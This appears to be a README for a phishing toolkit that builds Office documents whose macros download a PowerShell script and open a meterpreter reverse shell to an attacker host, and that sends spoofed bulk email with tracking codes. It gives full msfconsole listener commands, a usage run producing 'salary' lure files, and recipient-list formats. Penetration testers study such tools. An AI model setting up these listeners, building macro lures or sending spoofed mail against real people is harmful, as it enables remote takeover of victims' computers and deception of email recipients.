# Social-Engineering-Toys
Social Engineering Toys  
  
  
Check this blog post https://milo2012.wordpress.com/2016/02/01/phishing-toys/ for more information.  
  
**injectShell.py**  
  
The script generates office documents (xls, doc and ppt) that includes VBA code that downloads and run the Invoke-Shellcode.ps1 (creates a meterpreter reverse shell back to server) when the victim enables Macro in the document.  
  
You will need to run the windows/meterpreter/reverse_https payload on your the attacker host.  
```
$ ./msfconsole
msf> use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_https
msf exploit(handler) > set LHOST consulting.example.org
msf exploit(handler) > set LPORT 4443
msf exploit(handler) > set SessionCommunicationTimeout 0
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j
[*] Exploit running as background job.
```
  
Below is the help screen of the script.  
```
$  python injectShell.py -h
usage: injectShell.py [-h] [-t T] [-o O] [-ip IP] [-port PORT]

optional arguments:
  -h, --help  show this help message and exit
  -t T        [xls|doc|ppt|all]
  -o O        [output filename (without extension)]
  -ip IP      [meterpreter listener ip address]
  -port PORT  [meterpreter listener port]

```

Below is the script in action.  

```
$  python injectShell.py -t all -o salary -ip 192.168.1.6 -port 1111 
- Generated: salary.xls
- Generated: salary.doc
- Generated: salary.ppt
```
    
     
   
    
**sendEmail.py**  
This script is useful in sending spoofed emails to some SMTP servers. This can be useful in social engineering engagements.    
  
Below is the help screen of the script.    
```
$ python sendEmail.py -h
usage: sendEmail.py [-h] [-f F] [-n N] [-e E] [-t T] [-iL IL] [-v]

optional arguments:
  -h, --help  show this help message and exit
  -f F        [html file containing the email body]
  -n N        [recipient name]
  -e E        [recipient email]
  -t T        [delay between 1 to x seconds (random)]
  -iL IL      [file containing recipient name and email addresses per line
              separated by comma]
  -v          [verbose]
```
  
Below is the script in action.  
```
$ python sendEmail.py -iL namelist.txt -f sampleHtml.txt -t 10
Sending email to: test01@example.com  
```
  
Below are two sample formats of namelist.txt  
**Below is sample 1**  
The fields are separated by ","   
The first field is: recipient's name  
The second field is: recipient's email address  


```
Keith,keith123@hotmail.com
```

**Below is sample 2**  
The first field is: recipient's name  
The second field is: recipient's email address  
The last field is: tracking code  

```
Keith,keith123@hotmail.com,UAG21E
```
